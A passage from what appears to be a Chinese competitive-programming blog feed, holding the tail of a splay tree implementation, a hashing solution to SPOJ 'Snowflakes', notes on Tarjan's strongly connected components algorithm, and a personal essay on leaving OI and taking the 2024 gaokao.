class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span> k -= v-&gt;<span class="built_in">lSize</span>() + <span class="number">1</span>, v = v-&gt;ch[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Node *<span class="title">select</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        Node *pred = <span class="built_in">select</span>(l - <span class="number">1</span>), *succ = <span class="built_in">select</span>(r + <span class="number">1</span>);</span><br><span class="line">        pred-&gt;<span class="built_in">splay</span>();</span><br><span class="line">        succ-&gt;<span class="built_in">splay</span>(pred);</span><br><span class="line">        <span class="keyword">return</span> succ-&gt;ch[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reverse</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">select</span>(l, r)-&gt;rev ^= <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">fetch</span><span class="params">(<span class="type">int</span> *a)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> *p = a + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(Node *v, <span class="type">int</span> *&amp;p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!v) <span class="keyword">return</span>;</span><br><span class="line">        v-&gt;<span class="built_in">pushDown</span>();</span><br><span class="line">        <span class="built_in">dfs</span>(v-&gt;ch[<span class="number">0</span>], p);</span><br><span class="line">        <span class="keyword">if</span> (!v-&gt;bound) *p++ = v-&gt;x;</span><br><span class="line">        <span class="built_in">dfs</span>(v-&gt;ch[<span class="number">1</span>], p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) a[i] = i;</span><br><span class="line"></span><br><span class="line">    Splay&lt;<span class="type">int</span>&gt; splay;</span><br><span class="line">    splay.<span class="built_in">build</span>(a, n);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">        splay.<span class="built_in">reverse</span>(l, r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    splay.<span class="built_in">fetch</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>数据结构</tag>
        <tag>平衡树</tag>
        <tag>Splay</tag>
      </tags>
  </entry>
  <entry>
    <title>「SPOJ 4354」Snowflakes - Hash</title>
    <url>/spoj-4354/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.spoj.com/problems/TWINSNOW/">SPOJ 链接</a></p>
<p>有 <span class="math inline">\(n (n \le 10^5)\)</span>
个雪花。每个雪花是 <span class="math inline">\(6\)</span>
个数组成的一个环。若两个环经过旋转（也可不旋转）后环上数字相等，则两个雪花相同。若两个环顺时针和逆时针数字相同则两个环也相同。判断是否有相同的雪花。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>这道题我们可以利用 Hash 判断两个环是否相等。由于一个雪花的 <span
class="math inline">\(6\)</span> 个数有顺序，我们可以先生成 <span
class="math inline">\(6\)</span> 个 Hash 值 <span
class="math inline">\(\text{list}_i\)</span> 表示顺序。每个雪花的 Hash
值为 <span class="math inline">\(\sum_{i = 1}^n{\text{list}_i
a_i}\)</span>。对于每个雪花，我们将其的顺时针和逆时针两种情况旋转 <span
class="math inline">\(6\)</span> 次，每个雪花用
<code>unordered_map</code> 存下 <span class="math inline">\(12\)</span>
个 Hash 值，然后直接利用 <code>unordered_map</code>
判重即可。时间复杂度为 <span class="math inline">\(O(n)\)</span></p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXL = <span class="number">1e7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::mt19937 <span class="title">rng</span><span class="params">(std::random_device&#123;&#125;())</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> rand = [&amp;]() -&gt; <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> &#123; <span class="built_in">return</span> (<span class="number">1ull</span> &lt;&lt; (<span class="built_in">rng</span>() % <span class="number">31</span>)) ^ <span class="built_in">rng</span>(); &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>&gt; <span class="title">hash</span><span class="params">(MAXL + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= MAXL; i++) hash[i] = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>&gt; <span class="title">list</span><span class="params">(<span class="number">6</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) list[i] = <span class="built_in">rand</span>();</span><br><span class="line"></span><br><span class="line">    std::unordered_map&lt;<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>, <span class="type">bool</span>&gt; vis;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">12</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">            a[i + <span class="number">6</span>] = a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">6</span>; k++) res += hash[a[j + k]] * list[k];</span><br><span class="line">            <span class="keyword">if</span> (vis[res]) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Twin snowflakes found.&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>) vis[res] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">6</span>; k++) res += hash[a[j + <span class="number">5</span> - k]] * list[k];</span><br><span class="line">            <span class="keyword">if</span> (vis[res]) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Twin snowflakes found.&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>) vis[res] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No two snowflakes are alike.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>Hash</tag>
        <tag>SPOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>Tarjan 强连通分量学习笔记</title>
    <url>/tarjan-scc-notes/</url>
    <content><![CDATA[<p><del>鸽了好久</del></p>
<h1 id="概念">概念</h1>
<p>强连通图：指的是一张有向图，其中从任意一个节点出发，都可达到该图的所有节点。</p>
<p>强连通分量：指的是有向图的一种子图，满足该子图为强连通图，且这个子图是
<strong>极大</strong> 的，即对于一幅图 <span
class="math inline">\(G\)</span> 的强连通分量 <span
class="math inline">\(G_0\)</span>，我们无法找到一副子图 <span
class="math inline">\(G_1\)</span> 为强连通图，且满足 <span
class="math inline">\(G_0 \subsetneqq G_1 \subseteq G\)</span></p>
<span id="more"></span>
<h1 id="tarjan">Tarjan</h1>
<h2 id="时间戳">时间戳</h2>
<p>对于一张图，我们可以使用 Tarjan 算法求出这张图的强连通分量。</p>
<p>Tarjan 算法引入了一个概念：时间戳，即对一张图进行 DFS
时经过每个点的顺序。用 <span class="math inline">\(\text{dfn}_i\)</span>
表示。</p>
<p>对于下面这幅图：</p>
<img src="/tarjan-scc-notes/tarjan-scc-graph.png" class="">
<p>该图对应的时间戳为：</p>
<p><span class="math display">\[
\begin{align}
\text{dfn}_1 = 1 \quad \text{dfn}_2 = 2 \quad \text{dfn}_5 = 3 \quad
\text{dfn}_4 = 4 \\
\text{dfn}_3 = 5 \quad \text{dfn}_7 = 6 \quad \text{dfn}_6 = 7
\end{align}
\]</span></p>
<h2 id="边的分类">边的分类</h2>
<p>我们可以很容易地看出，对于一个环，环中的节点都属于同一个强连通分量。</p>
<p>Tarjan 则是通过改编 DFS 来找“环”的一种算法。</p>
<p>于是我们可以基于时间戳将边分个类。首先我们定义搜索所经过的边构成了一颗搜索树（或森林）。</p>
<p>于是对于有向边 <span class="math inline">\((x, y)\)</span>
我们可以得到下列几种边：</p>
<ul>
<li><p>树枝边：即为搜索时经过的边，反映在搜索树上即为 <span
class="math inline">\(x\)</span> 为 <span
class="math inline">\(y\)</span> 的父节点；</p></li>
<li><p>前向边：即为在搜索树中祖先节点指向孙子节点，即 <span
class="math inline">\(x\)</span> 为 <span
class="math inline">\(y\)</span> 的祖先；</p></li>
<li><p>后向边：即为在搜索树中孙子节点指向祖先节点，即 <span
class="math inline">\(y\)</span> 为 <span
class="math inline">\(x\)</span> 的祖先；</p></li>
<li><p>横插边：即为除了上述三种情况的边，此时必满足 <span
class="math inline">\(\text{dfn}_y &lt; \text{dfn}_x\)</span>。</p></li>
</ul>
<p>下面这幅图很好地阐释了四种边的类型（摘自《算法竞赛进阶指南》）。加粗的边为树枝边，其余边则取第一个汉字：</p>
<img src="/tarjan-scc-notes/tarjan-scc-edges.png" class="">
<h2 id="求解强连通分量">求解强连通分量</h2>
<h3 id="对环的理解">对“环”的理解</h3>
<p>对于“环”有影响的有两种边：后向边和横插边。</p>
<p>为了求后向边和横插边，我们可以维护一个栈，在访问 <span
class="math inline">\(x\)</span> 节点时，存储以下信息：</p>
<ul>
<li><p>搜索树上 <span class="math inline">\(x\)</span>
的祖先节点；</p></li>
<li><p>已经访问过的，且可通过一条路径就到达 <span
class="math inline">\(x\)</span> 祖先节点的节点。</p></li>
</ul>
<p>对于节点 <span class="math inline">\(y\)</span>，只要 <span
class="math inline">\(y\)</span> 有一条路径到 <span
class="math inline">\(x\)</span> 的祖先，且存在一条 <span
class="math inline">\(x \rightarrow y\)</span> 的横插边，显然 <span
class="math inline">\(x\)</span>、<span class="math inline">\(x\)</span>
的祖先和 <span class="math inline">\(y\)</span>
形成了一个环，属于同一个强连通分量。</p>
<h3 id="追溯值">追溯值</h3>
<p>接下来我们需要看怎么求树枝边和横插边。</p>
<p>这时我们可以引入一个追溯值 <span
class="math inline">\(\text{low}_i\)</span>，表示由节点 <span
class="math inline">\(i\)</span> 开始搜索所能到达的点中，在搜索树上是
<span class="math inline">\(i\)</span> 的祖先的节点中最小的时间戳。</p>
<p>于是我们可以对节点 <span class="math inline">\(x\)</span>
进行下列操作：</p>
<ol type="1">
<li><p>当节点 <span class="math inline">\(x\)</span> 第一次被访问时，把
<span class="math inline">\(x\)</span> 入栈，初始化 <span
class="math inline">\(\text{low}_x = \text{dfn}_x\)</span>；</p></li>
<li><p>扫描从 <span class="math inline">\(x\)</span> 出发的边 <span
class="math inline">\(x \rightarrow y\)</span>：</p>
<ol type="1">
<li><p>若 <span class="math inline">\(y\)</span> 没访问过，则说明 <span
class="math inline">\(y\)</span> 是 <span
class="math inline">\(x\)</span> 的树枝边，递归访问 <span
class="math inline">\(y\)</span>，从 <span
class="math inline">\(y\)</span> 回溯后，令 <span
class="math inline">\(\text{low}_x = \min \{ \text{low}_x, \text{low}_y
\}\)</span>；</p></li>
<li><p>若 <span class="math inline">\(y\)</span> 被访问过并且 <span
class="math inline">\(y\)</span> 在栈中，则令 <span
class="math inline">\(\text{low}_x = \min \{ \text{low}_x, \text{dfn}_y
\}\)</span>。</p></li>
</ol></li>
<li><p>从 <span class="math inline">\(x\)</span> 回溯之前，判断是否有
<span class="math inline">\(\text{low}_x =
\text{dfn}_x\)</span>。若成立，则不断从栈中弹出节点，直至 <span
class="math inline">\(x\)</span> 出栈。</p></li>
</ol>
<p>显然在第三步中当 <span class="math inline">\(\text{low}_x =
\text{dfn}_x\)</span> 时，栈顶到栈中 <span
class="math inline">\(x\)</span> 之间必有节点都通过树枝边或横插边连向
<span
class="math inline">\(x\)</span>，且其中的其余节点有至少一条路径连线该节点。即这些节点构成一个环，属于同一个强连通分量。此时只需在出栈的时候记录其中节点属于同一强连通分量即可。</p>
<p>Tarjan 的时间复杂度为 <span class="math inline">\(O(n +
m)\)</span>，是一个非常高效的算法。</p>
<h3 id="代码模板">代码模板</h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    dfn[x] = low[x] = ++num;</span><br><span class="line">    sta.<span class="built_in">push</span>(x);</span><br><span class="line">    ins[x] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : e[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[each]) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(each);</span><br><span class="line">            low[x] = std::<span class="built_in">min</span>(low[x], low[each]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ins[each]) &#123;</span><br><span class="line">            low[x] = std::<span class="built_in">min</span>(low[x], dfn[each]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dfn[x] == low[x]) &#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="type">int</span> y;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            y = sta.<span class="built_in">top</span>();</span><br><span class="line">            sta.<span class="built_in">pop</span>();</span><br><span class="line">            ins[y] = <span class="number">0</span>;</span><br><span class="line">            c[y] = cnt, scc[cnt].<span class="built_in">push_back</span>(y);</span><br><span class="line">        &#125; <span class="keyword">while</span> (x != y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="缩点">缩点</h2>
<p>求解完强连通分量可选择将强连通分量缩成一个点以便计算。</p>
<p>代码模板见下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : e[i]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c[i] == c[each]) <span class="keyword">continue</span>;</span><br><span class="line">        ec[c[i]].<span class="built_in">push_back</span>(c[each]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="例题">例题</h1>
<p><a href="https://www.luogu.com.cn/problem/P2341">洛谷 P2341
[USACO03FALL / HAOI2006] 受欢迎的牛 G</a></p>
<p>本题仅需要将强连通分量缩点，统计出出度为 <span
class="math inline">\(0\)</span> 的点的个数。若个数为 <span
class="math inline">\(1\)</span>，答案则为该连通分量内节点个数，否则没有明星牛。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; e[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> dfn[MAXN + <span class="number">1</span>], low[MAXN + <span class="number">1</span>], num = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt; sta;</span><br><span class="line"><span class="type">int</span> ins[MAXN + <span class="number">1</span>], c[MAXN + <span class="number">1</span>];</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; scc[MAXN + <span class="number">1</span>];</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; ec[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    dfn[x] = low[x] = ++num;</span><br><span class="line">    sta.<span class="built_in">push</span>(x);</span><br><span class="line">    ins[x] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : e[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[each]) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(each);</span><br><span class="line">            low[x] = std::<span class="built_in">min</span>(low[x], low[each]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ins[each]) &#123;</span><br><span class="line">            low[x] = std::<span class="built_in">min</span>(low[x], dfn[each]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dfn[x] == low[x]) &#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="type">int</span> y;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            y = sta.<span class="built_in">top</span>();</span><br><span class="line">            sta.<span class="built_in">pop</span>();</span><br><span class="line">            ins[y] = <span class="number">0</span>;</span><br><span class="line">            c[y] = cnt, scc[cnt].<span class="built_in">push_back</span>(y);</span><br><span class="line">        &#125; <span class="keyword">while</span> (x != y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, a, b; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        e[a].<span class="built_in">push_back</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(dfn, <span class="number">0</span>, <span class="built_in">sizeof</span>(dfn));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[i]) <span class="built_in">tarjan</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> each : e[i]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c[i] == c[each]) <span class="keyword">continue</span>;</span><br><span class="line">            ec[c[i]].<span class="built_in">push_back</span>(c[each]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> counts = <span class="number">0</span>, pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= cnt; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ec[i].<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            counts++;</span><br><span class="line">            pos = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (counts == <span class="number">1</span>) std::cout &lt;&lt; scc[pos].<span class="built_in">size</span>() &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">else</span> std::cout &lt;&lt; <span class="string">&quot;0&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>图论</tag>
        <tag>Tarjan</tag>
        <tag>强连通分量</tag>
      </tags>
  </entry>
  <entry>
    <title>The Day AFter OI</title>
    <url>/the-day-after-oi/</url>
    <content><![CDATA[
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=2158936855&auto=0&height=66"></iframe>

<p>秒速340mを超えていけ（超越秒速340m）</p>
<p>——《月並みに輝け（平凡亦熠）》（結束バンド（结束乐队））</p>
<blockquote>
<p>版本：2024 全国甲卷 四川副本（理科）</p>
</blockquote>
<h1 id="after-oi">AFter OI</h1>
<p>在参加 NOIP 2022
之后终于获得了省一，在当时由于对自己的文化课不太自信，报名了川大的网安少年班
<del>于是水了几篇 CTF
的笔记还翘掉了由于疫情推迟的成都高二上期末调考</del>。考试时候 OI
发挥得还不错、然而 CTF 由于考情估计错误只得了 20pts <del>谁 TMD
想得到基本全考 php 审计和逆向啊</del>，耻辱淘汰。于是就正式退役了。</p>
<p>重回班上后意外地班上的同学都挺热情的。作为曾经班上的局外人也很快地融入了班级，开始直面
<del>惨不忍睹</del> 的文化课。</p>
<span id="more"></span>
<h1 id="grade-12">Grade 12</h1>
<p>高二下基本沉浸在学习中，面对原本惨不忍睹的成绩经过恶补后除了语文外也略有提升
<del>语文提升则是后来长时间的女娲补天了</del>，没过多久就高三了。</p>
<p>进入高三的第一件事就是理综合卷
<del>已经是旧时代遗物了</del>，吃着曾经的底子和暑假的大量刷题，反而还适应地挺不错的。</p>
<p>何为高三？高三是每一天从起床就知道这天结局的平淡日子；高三是从早学到晚，脑子被知识灌满的充实和疲惫；高三是忙里偷闲的愉快却罪恶。虽偶尔有活动，但由于深感能力不足，自己确实也和班级并无过强的联系，也基本没怎么参加。高三确实给予了和竞赛完全不同的感觉。每天过着千篇一律的生活，恶补曾经不怎么上心的文化课，在学习中发掘新知识新理解的惊喜，在各科的跷跷板上不断游走，和同学朋友们聊聊天。成绩也终于从班上吊车尾攀了上去。一诊二诊三诊成绩陆续下来，看后至少还能感叹一句：有学上了。</p>
<p>高三是单调的、不愿经历的，但同时也是独特的、精彩的。高三的确能给予人一些磨练，让人变得更加成熟。</p>
<h1 id="ncee-2024">NCEE 2024</h1>
<p>到了高考前的三周，学校开始安排自主复习。给自己安排了满满当当的任务，直到高考来临仍没做完。每天白天不是在写题看题就是在写题看题的路上，晚上躺在床上也在止不住地胡思乱想。在熟练度上升的同时却因为长时间不做难题而导致的思维下降而焦虑。在此时学校也来了三发模考炸弹，意外地考得都还不错，最后两次甚至圆了
660+ 的梦。</p>
<p>高考前一周，班上却意外的流行起了感冒，高中锻炼不足，于是就被感染了
<del>焦虑++</del>，甚至在高考前一天开始低烧烧到了考试结束。在考前那一晚和数学老师聊了一下（老师们是真的好
QWQ），也终于提了点信心。</p>
<p>高考终于来了，那两天却沾床就睡，感觉从没睡过如此踏实的一觉。第一天考语文，按照平时的时间去做，答题卡也从未写得这么满，也从未感觉过做语文卷子如此顺畅。下午考数学却精神不振，在做选填时刻意放慢了速度，跳了
T16 一路做到圆曲导数压轴却感叹这次压轴出得太简单了。回头把 T16 写了
<del>高考后对答案发现少数了一种情况 QAQ</del> 还剩 10min
就开始检查。但直到最后 5min
突然看到立几大题二面角看错了，一下子大脑一片空白，在慌张下改得七七八八，算完正确的法向量就打铃了。出来后想到只扣
2pts 并没怎么太在意，反而想到这次数学考得太简单还有点后怕
<del>数学简单就拉不开差距了 QAQ</del>，甚至有点害怕今年会不会发展为 <a
href="https://www.zhihu.com/question/330671781">2019
年的情况</a>。晚上小复习了一会儿依然倒头就睡。</p>
<p>第二天理综，感觉有点卡，题也比前几年的难一些但还在控制范围内
<del>除了物理光学算出来答案 <span class="math inline">\(\frac{\sqrt{2 +
\sqrt{2}}}{2}\)</span>
感觉要寄</del>，遗憾的是高考场上理综没写完，空了化学计算一个空和物理压轴第二问的半个问。考完后对了一下答案
<del>发现一堆人算出来都是那个 sb
根中根</del>。下午英语刚发答题卡惊异于作文基本是成都三诊的原题，听力试音时却发现语速比曾经高考题快得多，感觉有点不对劲，在放听力时确实比前几年快，有几道题没听清
QWQ <del>看来之前学校训练 1.5
倍速听力还是正确的</del>，除了语填改错卡了一下其他也做得挺顺的，用标准衡水体写完作文后还剩十多分钟。</p>
<p>最后打铃，高中也终于结束了，仍有点恍惚。高考 2
天，弹指一挥间，似梦境一般。回到家后第一反应仍然是该不该拿出来书包中的作业，明天晚上是否该返校了。</p>
<p>高考后去参加了西安交大的数学强基，初试做得很顺手，顺利进入了复试。复试笔试考了些与抽象代数相关的东西，面试
<del>抽象 6 对 6</del> 意外地发挥地还不错。</p>
<p><del><strong>Upd on Nov 4th</strong>:
开学后学数学分析的时候才发现复试笔试考的是 Dedekind 分割中涉及的域
(包括有序域有限域等等). 该不会做的还是不会做 QWQ</del></p>
<p>最后出分：<span class="math inline">\(114\text{(语)} + 138\text{(数)}
+ 137\text{(英)} + 275\text{(综)}(102.5\text{(物)} + 92.5\text{(化)} +
80\text{(生)}) = 664\)</span>，估分范围内
<del>虽然数学确实拉了</del>。不久之后也顺利接到了强基录取的通知，顺利进入了
XJTU。</p>
<h1 id="after-ncee">After NCEE</h1>
<p>高考也终于结束。不得不说，从进入高中，参加竞赛，再回归文化课参加高考，一切都似在独木桥上跳舞，仿佛稍有差错就会坠入没学上的万丈深渊。从刚入高中的不屑却被现实狠狠打脸，后来文化课竞赛双开身心俱疲，再到脱产搞竞赛，竞赛退役后回归文化课也才悟出些门道。这是一条不容易的路，但至少从目前看来，这是走过的一条无比正确的路，也不后悔一路来的选择。</p>
